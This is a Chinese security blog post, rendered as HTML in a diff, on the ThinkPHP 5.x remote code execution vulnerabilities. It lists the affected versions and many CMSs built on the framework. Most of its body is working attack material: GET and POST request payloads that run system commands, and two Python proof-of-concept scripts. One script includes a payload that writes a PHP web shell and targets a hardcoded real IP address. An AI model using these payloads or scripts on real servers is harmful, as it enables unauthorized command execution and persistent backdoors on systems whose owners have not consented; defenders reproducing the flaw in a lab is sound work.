@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"butnomingzi.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":true,"sidebar":{"position":"right","Muse | Mist":320,"Pisces | Gemini":240,"width":300,"display":"always","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+
+  <meta name="description" content="ThinkPHP 5.x版本是官方于2015年发布的新一代框架，其中5.0版本于2016年的9月份布。ThinkPHP 5.x版本曝出多个远程代码执行漏洞。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP 5.x 远程代码执行">
+<meta property="og:url" content="https://butnomingzi.github.io/posts/8724785f/index.html">
+<meta property="og:site_name" content="Tpp_Tgg">
+<meta property="og:description" content="ThinkPHP 5.x版本是官方于2015年发布的新一代框架，其中5.0版本于2016年的9月份布。ThinkPHP 5.x版本曝出多个远程代码执行漏洞。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-09-21T02:05:26.000Z">
+<meta property="article:modified_time" content="2020-09-21T02:19:41.747Z">
+<meta property="article:author" content="oudeniu">
+<meta property="article:tag" content="ThinkPHP">
+<meta property="article:tag" content="RCE">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://butnomingzi.github.io/posts/8724785f/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ThinkPHP 5.x 远程代码执行 | Tpp_Tgg</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Tpp_Tgg</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">32</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">3</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">16</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://butnomingzi.github.io/posts/8724785f/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="oudeniu">
+      <meta itemprop="description" content="一点都对，半点都没错。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tpp_Tgg">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ThinkPHP 5.x 远程代码执行
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-09-21 10:05:26 / 修改时间：10:19:41" itemprop="dateCreated datePublished" datetime="2020-09-21T10:05:26+08:00">2020-09-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" itemprop="url" rel="index"><span itemprop="name">漏洞复现</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-users"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="firestore-visitors-count"></span>
+            </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>ThinkPHP 5.x版本是官方于2015年发布的新一代框架，其中5.0版本于2016年的9月份布。ThinkPHP 5.x版本曝出多个远程代码执行漏洞。</p>
+<a id="more"></a>
+
+<h1 id="ThinkPHP-5-x-代码执行"><a href="#ThinkPHP-5-x-代码执行" class="headerlink" title="ThinkPHP 5.x 代码执行"></a>ThinkPHP 5.x 代码执行</h1><ul>
+<li>GET：框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞。</li>
+<li>POST：本次漏洞触发点在Request.php文件里的method方法中，该方法的功能主要是判断请求类型。</li>
+</ul>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><h3 id="GET"><a href="#GET" class="headerlink" title="GET"></a>GET</h3><p>目前漏洞影响版本号包括：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5.</span>x &lt; <span class="number">5.1</span><span class="number">.31</span>, &lt;= <span class="number">5.0</span><span class="number">.23</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="POST"><a href="#POST" class="headerlink" title="POST"></a>POST</h3><p>目前漏洞影响版本号包括：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5.</span>x &lt;= <span class="number">5.0</span><span class="number">.23</span></span><br></pre></td></tr></table></figure>
+
+<p>以下基于ThinkPHP 5 二次开发的内容管理系统，很可能受到该漏洞影响，建议厂商及时更新。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">AdminLTE后台管理系统</span><br><span class="line">layui后台管理系统</span><br><span class="line">thinkcmf</span><br><span class="line">H-ui.admin后台管理系统</span><br><span class="line">tpshop</span><br><span class="line">FsatAdmin</span><br><span class="line">eyoucms</span><br><span class="line">LarryCMS后台管理系统</span><br><span class="line">tpadmin后台管理系统</span><br><span class="line">snake后台管理系统</span><br><span class="line">ThinkSNS</span><br><span class="line">DolphinPHP后台管理系统</span><br><span class="line">WeMall商城系统</span><br><span class="line">CLTPHP</span><br><span class="line">齐博CMS</span><br><span class="line">DSMALL</span><br><span class="line">YFCMF</span><br><span class="line">HisiPHP后台管理系统</span><br><span class="line">Tplay后台管理系统</span><br><span class="line">lyadmin后台管理系统</span><br><span class="line">haoid后台管理系统</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>GET和POST方式为两种不同的代码执行漏洞。</p>
+<h3 id="POC-Get方式"><a href="#POC-Get方式" class="headerlink" title="POC Get方式"></a>POC Get方式</h3><ul>
+<li>ThinkPHP5-RCE Version: 5.0.20/5.1.29/5.0.21/5.0.22/</li>
+</ul>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br><span class="line">index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">url</span>):</span>  <span class="comment"># 验证 是否存在</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url <span class="keyword">and</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = <span class="string">&#x27;http://&#x27;</span> + url</span><br><span class="line">    poc1 = <span class="string">&#x27;/index.php?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1&#x27;</span></span><br><span class="line">    poc2 = <span class="string">&#x27;/index.php?s=index/\\think\\app/invokefunction&amp;function=phpinfo&amp;vars[0]=100&#x27;</span></span><br><span class="line">    cmd = <span class="string">&#x27;/index.php?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami&#x27;</span></span><br><span class="line">    shell = <span class="string">&#x27;/index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=shell.php&amp;vars[1][]=&lt;?php @eval($_POST[c]);?&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url+poc1)</span><br><span class="line">        <span class="keyword">if</span> response.status_code ==<span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;SERVER_NAME&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;PayLoad : \n&#123;0&#125;\n&#123;1&#125;\n&#123;2&#125;\n&#123;3&#125;&#x27;</span>.format(poc1,poc2,cmd,shell)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            response = requests.get(url+poc2)</span><br><span class="line">            <span class="keyword">if</span> response.status_code ==<span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;SERVER_NAME&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;PayLoad : \n&#123;0&#125;\n&#123;1&#125;\n&#123;2&#125;&#x27;</span>.format(poc2,cmd,shell)</span><br><span class="line">            <span class="keyword">else</span>:<span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">str</span>):</span> <span class="comment">#攻击模块</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">c = poc(<span class="string">&#x27;https://39.105.137.230/&#x27;</span>)</span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>
+
+<h3 id="POC-POST方式"><a href="#POC-POST方式" class="headerlink" title="POC POST方式"></a>POC POST方式</h3><ul>
+<li>5.x &lt;= 5.0.23</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url/index.php?s=captcha</span><br><span class="line"></span><br><span class="line">POST data:</span><br><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span>(<span class="params">url</span>):</span>  <span class="comment"># 验证 是否存在</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;http://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url <span class="keyword">and</span> <span class="string">&#x27;https://&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        url = <span class="string">&#x27;http://&#x27;</span> + url + <span class="string">&#x27;/index.php?s=captcha&#x27;</span></span><br><span class="line">    data = <span class="string">&#x27;_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=echo 44899742450bdb319a869ed7438a61c6&#x27;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0(X11;Linuxx86_64;rv:67.0)Gecko/20100101 Firefox/67.0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>:<span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>:<span class="string">&quot;gzip,deflate&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>:<span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>:<span class="string">&quot;http://127.0.0.1:8080//index.php?s=captcha0&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;JSESSIONID=F7494C874B4E613FB6E023109349554A&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Forwarded-For&quot;</span>:<span class="string">&quot;192.168.201.21&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    url = url + <span class="string">&#x27;/index.php?s=captcha&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span>  response.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">&#x27;44899742450bdb319a869ed7438a61c6&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;存在ThinkPHP5-RCE&#x27;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">str</span>):</span> <span class="comment">#攻击模块</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line">s = poc(url)</span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure>
+
+<p>具体的版本已实际测试为准。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>oudeniu
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://butnomingzi.github.io/posts/8724785f/" title="ThinkPHP 5.x 远程代码执行">https://butnomingzi.github.io/posts/8724785f/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/ThinkPHP/" rel="tag"><i class="fa fa-tag"></i> ThinkPHP</a>
+              <a href="/tags/RCE/" rel="tag"><i class="fa fa-tag"></i> RCE</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/5b1d52cc/" rel="prev" title="爆破小文">
+      <i class="fa fa-chevron-left"></i> 爆破小文
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/61f8a63d/" rel="next" title="shiro RememberMe反序列化">
+      shiro RememberMe反序列化 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ThinkPHP-5-x-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">1.</span> <span class="nav-text">ThinkPHP 5.x 代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞影响</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#GET"><span class="nav-number">1.1.1.</span> <span class="nav-text">GET</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POST"><span class="nav-number">1.1.2.</span> <span class="nav-text">POST</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.2.</span> <span class="nav-text">总结</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-Get%E6%96%B9%E5%BC%8F"><span class="nav-number">1.2.1.</span> <span class="nav-text">POC Get方式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC-POST%E6%96%B9%E5%BC%8F"><span class="nav-number">1.2.2.</span> <span class="nav-text">POC POST方式</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">oudeniu</p>
+  <div class="site-description" itemprop="description">一点都对，半点都没错。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="cc-license motion-element" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC8="><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcG90YXRzb1NlYy8=" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;potatsoSec&#x2F;">宽字节安全</span>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+      <div id="music163player">
+        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=280 height=420 src="//music.163.com/outchain/player?type=0&id=5008808022&auto=1&height=430"></iframe>
+      </div>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">oudeniu</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">202k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">3:04</span>
+</div>
+    <!-- 网站运行时间的设置 -->
+    <span id="timeDate">载入天数...</span>
+    <span id="times">载入时分秒...</span>  
+    <script>
+        var now = new Date();
+        function createtime() {
+            var grt= new Date("03/03/2020 13:14:21");//此处修改你的建站时间或者网站上线时间
+            now.setTime(now.getTime()+250);
+            days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+            hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+            if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+            mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+            seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+            snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+            document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+            document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+        }
+    setInterval("createtime()",250);
+    </script>
+
+        
+<div class="busuanzi-count">
+  <script data-pjax async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
